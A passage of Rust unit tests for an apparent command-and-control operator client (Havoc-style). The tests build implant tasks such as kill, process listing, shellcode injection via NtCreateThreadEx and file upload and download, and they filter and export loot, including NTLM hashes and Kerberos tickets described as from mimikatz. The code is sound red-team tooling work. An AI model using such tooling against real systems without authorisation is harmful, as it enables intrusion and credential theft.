    fn resolve_tls_cli_fingerprint_overrides_known_servers() {
        let known_fp = "d".repeat(64);
        let cli_fp = "e".repeat(64);
        let mut known = KnownServersStore::default();
        known.trust("127.0.0.1:40056", &known_fp, None);
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: Some(cli_fp.clone()),
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig::default();
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &known, &cli.server).unwrap(),
            TlsVerification::Fingerprint(ref f) if f == &cli_fp
        ));
    }

    #[test]
    fn resolve_tls_known_servers_overrides_config_fingerprint() {
        let known_fp = "f".repeat(64);
        let config_fp = "0".repeat(64);
        let mut known = KnownServersStore::default();
        known.trust("127.0.0.1:40056", &known_fp, None);
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let config = LocalConfig { cert_fingerprint: Some(config_fp), ..LocalConfig::default() };
        assert!(matches!(
            resolve_tls_verification(&cli, &config, &known, &cli.server).unwrap(),
            TlsVerification::Fingerprint(ref f) if f == &known_fp
        ));
    }

    #[test]
    fn client_app_state_initializes_placeholder_state() {
        let app_state = AppState::new("wss://127.0.0.1:40056/havoc/".to_owned());

        assert_eq!(app_state.server_url, "wss://127.0.0.1:40056/havoc/");
        assert_eq!(app_state.connection_status, ConnectionStatus::Disconnected);
        assert!(app_state.operator_info.is_none());
        assert!(app_state.agents.is_empty());
        assert!(app_state.agent_consoles.is_empty());
        assert!(app_state.process_lists.is_empty());
        assert!(app_state.listeners.is_empty());
        assert!(app_state.loot.is_empty());
        assert!(app_state.event_log.entries.is_empty());
        assert!(app_state.online_operators.is_empty());
    }

    #[test]
    fn client_app_starts_in_login_phase() {
        let cli = Cli {
            server: DEFAULT_SERVER_URL.to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let app = ClientApp::new(cli).unwrap();
        assert!(matches!(app.phase, AppPhase::Login(_)));
    }

    #[test]
    fn client_app_login_state_uses_cli_default() {
        let cli = Cli {
            server: "wss://custom:1234/havoc/".to_owned(),
            scripts_dir: None,
            ca_cert: None,
            cert_fingerprint: None,
            accept_invalid_certs: false,
            purge_known_server: None,
        };
        let app = ClientApp::new(cli).unwrap();
        match &app.phase {
            AppPhase::Login(state) => {
                if app.local_config.server_url.is_none() {
                    assert_eq!(state.server_url, "wss://custom:1234/havoc/");
                }
            }
            _ => panic!("expected Login phase"),
        }
    }

    fn sample_agent(
        name_id: &str,
        hostname: &str,
        username: &str,
        elevated: bool,
        last_call_in: &str,
    ) -> AgentSummary {
        AgentSummary {
            name_id: name_id.to_owned(),
            status: "Alive".to_owned(),
            domain_name: "LAB".to_owned(),
            username: username.to_owned(),
            internal_ip: "10.0.0.10".to_owned(),
            external_ip: "203.0.113.10".to_owned(),
            hostname: hostname.to_owned(),
            process_arch: "x64".to_owned(),
            process_name: "explorer.exe".to_owned(),
            process_pid: "1234".to_owned(),
            elevated,
            os_version: "Windows 11".to_owned(),
            os_build: "22631".to_owned(),
            os_arch: "x64".to_owned(),
            sleep_delay: "5".to_owned(),
            sleep_jitter: "10".to_owned(),
            last_call_in: last_call_in.to_owned(),
            note: "primary workstation".to_owned(),
            pivot_parent: None,
            pivot_links: Vec::new(),
        }
    }

    #[test]
    fn agent_filter_matches_multiple_columns() {
        let agent = sample_agent("ABCD1234", "wkstn-1", "operator", true, "10/03/2026 12:00:00");
        assert!(agent_matches_filter(&agent, "wkstn"));
        assert!(agent_matches_filter(&agent, "primary"));
        assert!(agent_matches_filter(&agent, "10.0.0.10"));
        assert!(!agent_matches_filter(&agent, "sqlservr"));
    }

    #[test]
    fn sort_agents_orders_by_last_checkin_descending() {
        let mut agents = vec![
            sample_agent("AAAA0001", "wkstn-1", "alice", false, "10/03/2026 11:00:00"),
            sample_agent("BBBB0002", "wkstn-2", "bob", true, "10/03/2026 12:00:00"),
        ];

        sort_agents(&mut agents, AgentSortColumn::LastCheckin, true);

        assert_eq!(agents[0].name_id, "BBBB0002");
        assert_eq!(agents[1].name_id, "AAAA0001");
    }

    #[test]
    fn sort_button_label_marks_active_column() {
        assert_eq!(
            sort_button_label(Some(AgentSortColumn::Hostname), false, AgentSortColumn::Hostname),
            "Hostname ^"
        );
        assert_eq!(
            sort_button_label(Some(AgentSortColumn::Hostname), true, AgentSortColumn::Id),
            "ID"
        );
    }

    #[test]
    fn build_kill_task_uses_exit_command_shape() {
        let OperatorMessage::AgentTask(message) = build_kill_task("ABCD1234", "operator") else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.demon_id, "ABCD1234");
        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandExit).to_string());
        assert_eq!(message.info.command.as_deref(), Some("kill"));
    }

    #[test]
    fn build_process_list_task_marks_process_manager_origin() {
        let OperatorMessage::AgentTask(message) = build_process_list_task("ABCD1234", "operator")
        else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandProcList).to_string());
        assert_eq!(
            message.info.extra.get("FromProcessManager"),
            Some(&serde_json::Value::Bool(true))
        );
    }

    #[test]
    fn build_process_injection_task_encodes_shellcode_payload() {
        let OperatorMessage::AgentTask(message) = build_process_injection_task(
            "ABCD1234",
            4444,
            "x64",
            InjectionTechnique::NtCreateThreadEx,
            &[0x90, 0x90, 0xCC],
            "--flag",
            InjectionTargetAction::Inject,
            "operator",
        ) else {
            panic!("expected agent task");
        };

        assert_eq!(
            message.info.command_id,
            u32::from(DemonCommand::CommandInjectShellcode).to_string()
        );
        assert_eq!(
            message.info.extra.get("Technique"),
            Some(&serde_json::Value::String("ntcreatethreadex".to_owned()))
        );
        assert_eq!(
            message.info.extra.get("Binary"),
            Some(&serde_json::Value::String("kJDM".to_owned()))
        );
        assert_eq!(
            message.info.extra.get("Arguments"),
            Some(&serde_json::Value::String("LS1mbGFn".to_owned()))
        );
    }

    #[test]
    fn build_note_task_uses_teamserver_note_shape() {
        let OperatorMessage::AgentTask(message) =
            build_note_task("ABCD1234", "triaged", "operator")
        else {
            panic!("expected agent task");
        };

        assert_eq!(message.head.user, "operator");
        assert_eq!(message.info.demon_id, "ABCD1234");
        assert_eq!(message.info.command_id, "Teamserver");
        assert_eq!(message.info.command.as_deref(), Some("note"));
        assert_eq!(message.info.arguments.as_deref(), Some("triaged"));
    }

    #[test]
    fn build_chat_message_uses_chat_wire_shape() {
        let Some(OperatorMessage::ChatMessage(message)) =
            build_chat_message(Some("operator"), " hello team ")
        else {
            panic!("expected chat message");
        };

        assert_eq!(message.head.event, EventCode::Chat);
        assert_eq!(
            message.info.fields.get("Message"),
            Some(&serde_json::Value::String("hello team".to_owned()))
        );
    }

    #[test]
    fn build_console_task_encodes_filesystem_download() {
        let OperatorMessage::AgentTask(message) =
            build_console_task("ABCD1234", "download C:\\Temp\\report.txt", "operator")
                .unwrap_or_else(|error| panic!("console task should build: {error}"))
        else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(message.info.sub_command.as_deref(), Some("download"));
        assert_eq!(message.info.arguments.as_deref(), Some("QzpcVGVtcFxyZXBvcnQudHh0"));
    }

    #[test]
    fn file_browser_list_task_uses_explorer_arguments() {
        let OperatorMessage::AgentTask(message) =
            build_file_browser_list_task("ABCD1234", "C:\\Temp", "operator")
        else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(message.info.sub_command.as_deref(), Some("dir"));
        assert_eq!(message.info.arguments.as_deref(), Some("C:\\Temp;true;false;false;false;;;"));
    }

    #[test]
    fn file_browser_upload_task_encodes_remote_path_and_content() {
        let OperatorMessage::AgentTask(message) = build_file_browser_upload_task(
            "ABCD1234",
            "C:\\Temp\\report.txt",
            b"hello",
            "operator",
        ) else {
            panic!("expected agent task");
        };

        assert_eq!(message.info.sub_command.as_deref(), Some("upload"));
        assert_eq!(message.info.arguments.as_deref(), Some("QzpcVGVtcFxyZXBvcnQudHh0;aGVsbG8="));
    }

    #[test]
    fn build_console_task_rejects_missing_process_kill_pid() {
        let error = build_console_task("ABCD1234", "proc kill", "operator")
            .expect_err("missing pid should fail");
        assert_eq!(error, "Usage: proc kill <pid>");
    }

    #[test]
    fn filtered_process_rows_matches_name_and_pid() {
        let rows = vec![
            ProcessEntry {
                pid: 1010,
                ppid: 4,
                name: "explorer.exe".to_owned(),
                arch: "x64".to_owned(),
                user: "LAB\\operator".to_owned(),
                session: 1,
            },
            ProcessEntry {
                pid: 2020,
                ppid: 4,
                name: "svchost.exe".to_owned(),
                arch: "x64".to_owned(),
                user: "SYSTEM".to_owned(),
                session: 0,
            },
        ];

        assert_eq!(filtered_process_rows(&rows, "explorer").len(), 1);
        assert_eq!(filtered_process_rows(&rows, "2020").len(), 1);
        assert_eq!(filtered_process_rows(&rows, "missing").len(), 0);
    }

    #[test]
    fn normalized_process_arch_maps_unknown_values_to_x64() {
        assert_eq!(normalized_process_arch("x86"), "x86");
        assert_eq!(normalized_process_arch("WOW64"), "x64");
    }

    #[test]
    fn history_navigation_walks_commands_and_resets() {
        let mut console = AgentConsoleState::default();
        push_history_entry(&mut console, "ps");
        push_history_entry(&mut console, "pwd");

        apply_history_step(&mut console, HistoryDirection::Older);
        assert_eq!(console.input, "pwd");

        apply_history_step(&mut console, HistoryDirection::Older);
        assert_eq!(console.input, "ps");

        apply_history_step(&mut console, HistoryDirection::Newer);
        assert_eq!(console.input, "pwd");

        apply_history_step(&mut console, HistoryDirection::Newer);
        assert!(console.input.is_empty());
    }

    #[test]
    fn completion_cycles_supported_commands() {
        let mut console =
            AgentConsoleState { input: "p".to_owned(), ..AgentConsoleState::default() };

        apply_completion(&mut console);
        assert_eq!(console.input, "ps");

        apply_completion(&mut console);
        assert_eq!(console.input, "pwd");

        apply_completion(&mut console);
        assert_eq!(console.input, "proc");
    }

    #[test]
    fn split_console_selection_prefers_selected_agent() {
        let open = vec!["A".to_owned(), "B".to_owned(), "C".to_owned()];
        let visible = split_console_selection(&open, Some("C"));
        assert_eq!(visible, vec!["C", "A"]);
    }

    #[test]
    fn build_session_graph_uses_explicit_pivot_parent() {
        let mut child = sample_agent("BBBB0002", "wkstn-2", "bob", false, "10/03/2026 12:01:00");
        child.pivot_parent = Some("AAAA0001".to_owned());
        let agents =
            vec![sample_agent("AAAA0001", "wkstn-1", "alice", false, "10/03/2026 12:00:00"), child];

        let graph = build_session_graph(&agents);

        assert!(graph.edges.iter().any(|edge| edge.from == "AAAA0001" && edge.to == "BBBB0002"));
        assert!(
            graph
                .edges
                .iter()
                .any(|edge| edge.from == SESSION_GRAPH_ROOT_ID && edge.to == "AAAA0001")
        );
    }

    #[test]
    fn build_session_graph_falls_back_to_pivot_links() {
        let mut parent = sample_agent("AAAA0001", "wkstn-1", "alice", false, "10/03/2026 12:00:00");
        parent.pivot_links.push("BBBB0002".to_owned());
        let child = sample_agent("BBBB0002", "wkstn-2", "bob", false, "10/03/2026 12:01:00");

        let graph = build_session_graph(&[parent, child]);

        assert!(graph.edges.iter().any(|edge| edge.from == "AAAA0001" && edge.to == "BBBB0002"));
    }

    #[test]
    fn agent_is_active_status_matches_expected_markers() {
        assert!(agent_is_active_status("Alive"));
        assert!(agent_is_active_status("true"));
        assert!(!agent_is_active_status("Dead"));
        assert!(!agent_is_active_status("Offline"));
    }

    #[test]
    fn loot_filter_matches_type_agent_and_text() {
        let item = LootItem {
            id: None,
            kind: LootKind::Screenshot,
            name: "desktop.png".to_owned(),
            agent_id: "ABCD1234".to_owned(),
            source: "download".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: Some("C:/Temp/desktop.png".to_owned()),
            size_bytes: Some(1024),
            content_base64: None,
            preview: Some("primary desktop".to_owned()),
        };

        assert!(loot_matches_filters(
            &item,
            LootTypeFilter::Screenshots,
            CredentialSubFilter::All,
            FileSubFilter::All,
            "abcd",
            "",
            "",
            "desktop"
        ));
        assert!(!loot_matches_filters(
            &item,
            LootTypeFilter::Credentials,
            CredentialSubFilter::All,
            FileSubFilter::All,
            "",
            "",
            "",
            ""
        ));
    }

    #[test]
    fn download_loot_item_rejects_missing_content() {
        let item = LootItem {
            id: None,
            kind: LootKind::File,
            name: "report.txt".to_owned(),
            agent_id: "ABCD1234".to_owned(),
            source: "download".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: Some("C:\\Temp\\report.txt".to_owned()),
            size_bytes: Some(12),
            content_base64: None,
            preview: None,
        };

        let error = download_loot_item(&item)
            .expect_err("download_loot_item should reject missing content");
        assert_eq!(error, "This loot item does not include downloadable content.");
    }

    #[test]
    fn download_loot_item_reports_decode_failures() {
        let item = LootItem {
            id: None,
            kind: LootKind::Screenshot,
            name: "desktop.png".to_owned(),
            agent_id: "ABCD1234".to_owned(),
            source: "download".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: None,
            size_bytes: Some(12),
            content_base64: Some("%%% definitely-not-base64 %%%".to_owned()),
            preview: None,
        };

        let error =
            download_loot_item(&item).expect_err("download_loot_item should reject invalid base64");
        assert!(error.starts_with("Failed to decode loot payload: "));
    }

    #[test]
    fn download_loot_item_saves_bytes_with_sanitized_file_name() {
        let _guard = lock_export_test();
        let unique_id = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_else(|error| panic!("system clock should be after unix epoch: {error}"))
            .as_nanos();
        let file_stub = format!("report-{unique_id}");
        let expected_bytes = b"loot-bytes-\x00\xFF";
        let output_dir = dirs::download_dir().unwrap_or_else(std::env::temp_dir);
        let item = LootItem {
            id: Some(9),
            kind: LootKind::File,
            name: "fallback-name.bin".to_owned(),
            agent_id: "ABCD1234".to_owned(),
            source: "download".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: Some(format!("C:\\Temp\\{file_stub}:Q1?.zip")),
            size_bytes: Some(expected_bytes.len() as u64),
            content_base64: Some(base64::engine::general_purpose::STANDARD.encode(expected_bytes)),
            preview: None,
        };

        let message = download_loot_item(&item)
            .unwrap_or_else(|error| panic!("download_loot_item should succeed: {error}"));
        let saved_path = PathBuf::from(
            message
                .strip_prefix("Saved ")
                .unwrap_or_else(|| panic!("save message missing path: {message}")),
        );
        assert_eq!(saved_path.parent(), Some(output_dir.as_path()));
        let saved_file_name = saved_path
            .file_name()
            .and_then(|value| value.to_str())
            .unwrap_or_else(|| panic!("saved path missing file name: {}", saved_path.display()));
        assert!(saved_file_name.starts_with("C__Temp_report-"));
        assert!(saved_file_name.contains(&file_stub));
        assert!(saved_file_name.ends_with("_Q1_.zip"));
        let saved_bytes = std::fs::read(&saved_path).unwrap_or_else(|error| {
            panic!("failed to read saved file {}: {error}", saved_path.display())
        });
        assert_eq!(saved_bytes, expected_bytes);
        std::fs::remove_file(&saved_path).unwrap_or_else(|error| {
            panic!("failed to remove saved file {}: {error}", saved_path.display())
        });
    }

    fn make_loot_item(kind: LootKind, name: &str, agent_id: &str, collected_at: &str) -> LootItem {
        LootItem {
            id: None,
            kind,
            name: name.to_owned(),
            agent_id: agent_id.to_owned(),
            source: "test".to_owned(),
            collected_at: collected_at.to_owned(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: None,
        }
    }

    fn exported_path(message: &str) -> PathBuf {
        let Some((_, path)) = message.split_once(" to ") else {
            panic!("export message missing output path: {message}");
        };
        PathBuf::from(path)
    }

    fn read_exported_file(message: &str) -> String {
        let path = exported_path(message);
        let contents = std::fs::read_to_string(&path).unwrap_or_else(|error| {
            panic!("failed to read exported file {}: {error}", path.display())
        });
        std::fs::remove_file(&path).unwrap_or_else(|error| {
            panic!("failed to remove exported file {}: {error}", path.display())
        });
        contents
    }

    #[test]
    fn loot_time_range_filter_since_excludes_older_items() {
        let item = make_loot_item(LootKind::File, "secret.exe", "AA", "2026-03-05T10:00:00Z");
        // since=2026-03-10 should exclude an item collected on 2026-03-05
        assert!(!loot_matches_filters(
            &item,
            LootTypeFilter::All,
            CredentialSubFilter::All,
            FileSubFilter::All,
            "",
            "2026-03-10",
            "",
            ""
        ));
    }

    #[test]
    fn loot_time_range_filter_until_excludes_newer_items() {
        let item = make_loot_item(LootKind::File, "secret.exe", "AA", "2026-03-20T10:00:00Z");
        // until=2026-03-15 should exclude an item collected on 2026-03-20
        assert!(!loot_matches_filters(
            &item,
            LootTypeFilter::All,
            CredentialSubFilter::All,
            FileSubFilter::All,
            "",
            "",
            "2026-03-15",
            ""
        ));
    }

    #[test]
    fn loot_time_range_filter_passes_item_in_range() {
        let item = make_loot_item(LootKind::File, "secret.exe", "AA", "2026-03-12T10:00:00Z");
        assert!(loot_matches_filters(
            &item,
            LootTypeFilter::All,
            CredentialSubFilter::All,
            FileSubFilter::All,
            "",
            "2026-03-10",
            "2026-03-15",
            ""
        ));
    }

    #[test]
    fn detect_credential_category_ntlm() {
        // Name contains "ntlm" keyword
        let item = make_loot_item(LootKind::Credential, "NTLM hash", "AA", "");
        assert_eq!(detect_credential_category(&item), CredentialSubFilter::NtlmHash);

        // Source labelled "ntlm" — e.g. from a mimikatz sekurlsa::msv dump
        let mut item2 = make_loot_item(LootKind::Credential, "Administrator", "AA", "");
        item2.source = "ntlm".to_owned();
        assert_eq!(detect_credential_category(&item2), CredentialSubFilter::NtlmHash);
    }

    #[test]
    fn detect_credential_category_kerberos() {
        let item = make_loot_item(LootKind::Credential, "TGT ticket.kirbi", "AA", "");
        assert_eq!(detect_credential_category(&item), CredentialSubFilter::KerberosTicket);
    }

    #[test]
    fn detect_credential_category_certificate() {
        let item = make_loot_item(LootKind::Credential, "user.pfx", "AA", "");
        assert_eq!(detect_credential_category(&item), CredentialSubFilter::Certificate);
    }

    #[test]
    fn detect_credential_category_plaintext() {
        let item = make_loot_item(LootKind::Credential, "plaintext password", "AA", "");
        assert_eq!(detect_credential_category(&item), CredentialSubFilter::Plaintext);
    }

    #[test]
    fn detect_file_category_document() {
        let mut item = make_loot_item(LootKind::File, "report.pdf", "AA", "");
        item.file_path = Some("C:\\Users\\alice\\report.pdf".to_owned());
        assert_eq!(detect_file_category(&item), FileSubFilter::Document);
    }

    #[test]
    fn detect_file_category_archive() {
        let mut item = make_loot_item(LootKind::File, "backup.zip", "AA", "");
        item.file_path = Some("C:\\Temp\\backup.zip".to_owned());
        assert_eq!(detect_file_category(&item), FileSubFilter::Archive);
    }

    #[test]
    fn loot_cred_sub_filter_ntlm_excludes_plaintext() {
        let mut item = make_loot_item(LootKind::Credential, "plaintext password", "AA", "");
        item.preview = Some("P@ssw0rd".to_owned());
        assert!(!loot_matches_filters(
            &item,
            LootTypeFilter::Credentials,
            CredentialSubFilter::NtlmHash,
            FileSubFilter::All,
            "",
            "",
            "",
            ""
        ));
    }

    #[test]
    fn loot_file_sub_filter_document_excludes_archives() {
        let mut item = make_loot_item(LootKind::File, "data.zip", "AA", "");
        item.file_path = Some("C:\\Temp\\data.zip".to_owned());
        assert!(!loot_matches_filters(
            &item,
            LootTypeFilter::Files,
            CredentialSubFilter::All,
            FileSubFilter::Document,
            "",
            "",
            "",
            ""
        ));
    }

    #[test]
    fn export_loot_csv_writes_file_and_returns_path() {
        let _guard = lock_export_test();
        let items: Vec<&LootItem> = vec![];
        // exporting zero items should still succeed and report 0 items
        let result = export_loot_csv(&items);
        assert!(result.is_ok(), "export_loot_csv failed: {:?}", result.err());
        assert!(result.unwrap().contains("0 item(s)"));
    }

    #[test]
    fn export_loot_json_writes_file_and_returns_path() {
        let _guard = lock_export_test();
        let items: Vec<&LootItem> = vec![];
        let result = export_loot_json(&items);
        assert!(result.is_ok(), "export_loot_json failed: {:?}", result.err());
        assert!(result.unwrap().contains("0 item(s)"));
    }

    #[test]
    fn export_loot_csv_serializes_non_empty_rows_and_escapes_fields() {
        let _guard = lock_export_test();
        let credential = LootItem {
            id: Some(7),
            kind: LootKind::Credential,
            name: "admin".to_owned(),
            agent_id: "operator,local".to_owned(),
            source: "ntlm sekurlsa \"logonpasswords\"".to_owned(),
            collected_at: "2026-03-18T09:10:11Z".to_owned(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: Some("hash,user\nline2".to_owned()),
        };
        let file = LootItem {
            id: Some(42),
            kind: LootKind::File,
            name: "report, \"Q1\".zip".to_owned(),
            agent_id: "BEEFCAFE".to_owned(),
            source: "browser download".to_owned(),
            collected_at: "2026-03-18T10:11:12Z".to_owned(),
            file_path: Some("C:\\Loot\\report, \"Q1\".zip".to_owned()),
            size_bytes: Some(2048),
            content_base64: None,
            preview: None,
        };
        let items = vec![&credential, &file];

        let result =
            export_loot_csv(&items).unwrap_or_else(|error| panic!("CSV export failed: {error}"));
        assert!(result.contains("2 item(s)"));

        let contents = read_exported_file(&result);
        assert!(contents.starts_with(
            "id,kind,sub_category,name,agent_id,source,collected_at,file_path,size_bytes,preview\n"
        ));
        assert!(contents.contains(
            "7,Credential,NTLM Hash,admin,\"operator,local\",\"ntlm sekurlsa \"\"logonpasswords\"\"\",2026-03-18T09:10:11Z,,,\"hash,user\nline2\"\n"
        ));
        assert!(contents.contains(
            "42,File,Archive,\"report, \"\"Q1\"\".zip\",BEEFCAFE,browser download,2026-03-18T10:11:12Z,\"C:\\Loot\\report, \"\"Q1\"\".zip\",2048,\n"
        ));
    }

    #[test]
    fn export_loot_json_serializes_non_empty_rows_and_preserves_nulls() {
        let _guard = lock_export_test();
        let credential = LootItem {
            id: Some(7),
            kind: LootKind::Credential,
            name: "admin".to_owned(),
            agent_id: "operator,local".to_owned(),
            source: "ntlm sekurlsa \"logonpasswords\"".to_owned(),
            collected_at: "2026-03-18T09:10:11Z".to_owned(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: Some("hash,user\nline2".to_owned()),
        };
        let file = LootItem {
            id: Some(42),
            kind: LootKind::File,
            name: "report, \"Q1\".zip".to_owned(),
            agent_id: "BEEFCAFE".to_owned(),
            source: "browser download".to_owned(),
            collected_at: "2026-03-18T10:11:12Z".to_owned(),
            file_path: Some("C:\\Loot\\report, \"Q1\".zip".to_owned()),
            size_bytes: Some(2048),
            content_base64: None,
            preview: None,
        };
        let items = vec![&credential, &file];

        let result =
            export_loot_json(&items).unwrap_or_else(|error| panic!("JSON export failed: {error}"));
        assert!(result.contains("2 item(s)"));

        let contents = read_exported_file(&result);
        assert!(contents.contains("ntlm sekurlsa \\\"logonpasswords\\\""));
        assert!(contents.contains("hash,user\\nline2"));

        let exported: serde_json::Value = serde_json::from_str(&contents)
            .unwrap_or_else(|error| panic!("failed to parse exported JSON: {error}"));
        let entries = exported.as_array().expect("loot export should be a JSON array");
        assert_eq!(entries.len(), 2);

        assert_eq!(entries[0]["id"], serde_json::Value::from(7));
        assert_eq!(entries[0]["kind"], serde_json::Value::from("Credential"));
        assert_eq!(entries[0]["sub_category"], serde_json::Value::from("NTLM Hash"));
        assert_eq!(entries[0]["agent_id"], serde_json::Value::from("operator,local"));
        assert_eq!(
            entries[0]["source"],
            serde_json::Value::from("ntlm sekurlsa \"logonpasswords\"")
        );
        assert_eq!(entries[0]["collected_at"], serde_json::Value::from("2026-03-18T09:10:11Z"));
        assert_eq!(entries[0]["file_path"], serde_json::Value::Null);
        assert_eq!(entries[0]["size_bytes"], serde_json::Value::Null);
        assert_eq!(entries[0]["preview"], serde_json::Value::from("hash,user\nline2"));

        assert_eq!(entries[1]["id"], serde_json::Value::from(42));
        assert_eq!(entries[1]["kind"], serde_json::Value::from("File"));
        assert_eq!(entries[1]["sub_category"], serde_json::Value::from("Archive"));
        assert_eq!(entries[1]["name"], serde_json::Value::from("report, \"Q1\".zip"));
        assert_eq!(
            entries[1]["file_path"],
            serde_json::Value::from("C:\\Loot\\report, \"Q1\".zip")
        );
        assert_eq!(entries[1]["size_bytes"], serde_json::Value::from(2048_u64));
        assert_eq!(entries[1]["preview"], serde_json::Value::Null);
    }

    #[test]
    fn csv_field_escapes_commas_and_quotes() {
        assert_eq!(csv_field("hello, world"), "\"hello, world\"");
        assert_eq!(csv_field("say \"hi\""), "\"say \"\"hi\"\"\"");
        assert_eq!(csv_field("plain"), "plain");
        assert_eq!(csv_field("bare\rreturn"), "\"bare\rreturn\"");
        assert_eq!(csv_field("line\nfeed"), "\"line\nfeed\"");
    }

    #[test]
    fn csv_field_sanitizes_formula_injection() {
        // Plain formula triggers get a leading single-quote (no quoting needed).
        assert_eq!(csv_field("=SUM(A1)"), "'=SUM(A1)");
        assert_eq!(csv_field("+SUM(A1)"), "'+SUM(A1)");
        assert_eq!(csv_field("-1+2"), "'-1+2");
        assert_eq!(csv_field("@SUM(A1)"), "'@SUM(A1)");
        // Leading whitespace: the first *non-whitespace* character determines injection risk.
        assert_eq!(csv_field("  =foo"), "'  =foo");
        // Formula trigger + embedded double-quote → prefix applied, then CSV-quoted.
        assert_eq!(csv_field("=EXEC(\"x\")"), "\"'=EXEC(\"\"x\"\")\"");
        // Values that do not start with a trigger must not be modified.
        assert_eq!(csv_field("plain"), "plain");
        assert_eq!(csv_field("hello, world"), "\"hello, world\"");
        // A bare minus sign (e.g. used as an empty sentinel) must also be neutralised.
        assert_eq!(csv_field("-"), "'-");
    }

    #[test]
    fn sanitize_file_name_replaces_invalid_characters() {
        assert_eq!(sanitize_file_name("C:\\Temp\\report?.txt"), "C__Temp_report_.txt");
    }

    #[test]
    fn sanitize_file_name_returns_fallback_for_empty_input() {
        assert_eq!(sanitize_file_name(""), "loot.bin");
    }

    #[test]
    fn sanitize_file_name_returns_fallback_for_whitespace_only() {
        assert_eq!(sanitize_file_name("   "), "loot.bin");
    }

    #[test]
    fn sanitize_file_name_preserves_safe_names() {
        assert_eq!(sanitize_file_name("screenshot.png"), "screenshot.png");
    }

    // ---- derive_download_file_name tests ----

    #[test]
    fn derive_download_file_name_uses_file_path_basename() {
        let item = LootItem {
            id: None,
            kind: LootKind::File,
            name: "fallback-name.bin".to_owned(),
            agent_id: "AGENT01".to_owned(),
            source: "download".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: Some("/home/user/Documents/secrets.docx".to_owned()),
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        assert_eq!(derive_download_file_name(&item), "secrets.docx");
    }

    #[test]
    fn derive_download_file_name_falls_back_to_name_when_no_file_path() {
        let item = LootItem {
            id: None,
            kind: LootKind::Screenshot,
            name: "desktop.png".to_owned(),
            agent_id: "AGENT01".to_owned(),
            source: "screenshot".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        assert_eq!(derive_download_file_name(&item), "desktop.png");
    }

    #[test]
    fn derive_download_file_name_sanitizes_dangerous_characters() {
        let item = LootItem {
            id: None,
            kind: LootKind::File,
            name: "fallback.bin".to_owned(),
            agent_id: "AGENT01".to_owned(),
            source: "download".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: Some("/tmp/report<v2>.txt".to_owned()),
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        assert_eq!(derive_download_file_name(&item), "report_v2_.txt");
    }

    #[test]
    fn derive_download_file_name_falls_back_to_name_when_file_path_has_no_basename() {
        let item = LootItem {
            id: None,
            kind: LootKind::File,
            name: "my-report.txt".to_owned(),
            agent_id: "AGENT01".to_owned(),
            source: "download".to_owned(),
            collected_at: "2026-03-10T12:00:00Z".to_owned(),
            file_path: Some("/".to_owned()),
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        assert_eq!(derive_download_file_name(&item), "my-report.txt");
    }

    // ---- next_available_path tests ----

    #[test]
    fn next_available_path_returns_original_when_no_collision() {
        let dir = std::env::temp_dir().join("rc2-test-navail-nocoll");
        let _ = std::fs::create_dir_all(&dir);
        let candidate = dir.join("unique-file.txt");
        // Ensure it does not exist
        let _ = std::fs::remove_file(&candidate);
        assert_eq!(next_available_path(&candidate), candidate);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn next_available_path_appends_suffix_on_collision() {
        let dir = std::env::temp_dir().join("rc2-test-navail-coll1");
        let _ = std::fs::create_dir_all(&dir);
        let base = dir.join("report.txt");
        std::fs::write(&base, b"existing").unwrap_or_else(|e| panic!("write failed: {e}"));

        let result = next_available_path(&base);
        assert_eq!(result, dir.join("report-1.txt"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn next_available_path_skips_multiple_collisions() {
        let dir = std::env::temp_dir().join("rc2-test-navail-multi");
        let _ = std::fs::create_dir_all(&dir);
        let base = dir.join("data.csv");
        std::fs::write(&base, b"v0").unwrap_or_else(|e| panic!("write failed: {e}"));
        std::fs::write(dir.join("data-1.csv"), b"v1")
            .unwrap_or_else(|e| panic!("write failed: {e}"));
        std::fs::write(dir.join("data-2.csv"), b"v2")
            .unwrap_or_else(|e| panic!("write failed: {e}"));

        let result = next_available_path(&base);
        assert_eq!(result, dir.join("data-3.csv"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn next_available_path_handles_no_extension() {
        let dir = std::env::temp_dir().join("rc2-test-navail-noext");
        let _ = std::fs::create_dir_all(&dir);
        let base = dir.join("README");
        std::fs::write(&base, b"exists").unwrap_or_else(|e| panic!("write failed: {e}"));

        let result = next_available_path(&base);
        assert_eq!(result, dir.join("README-1"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn parent_remote_path_returns_windows_parent() {
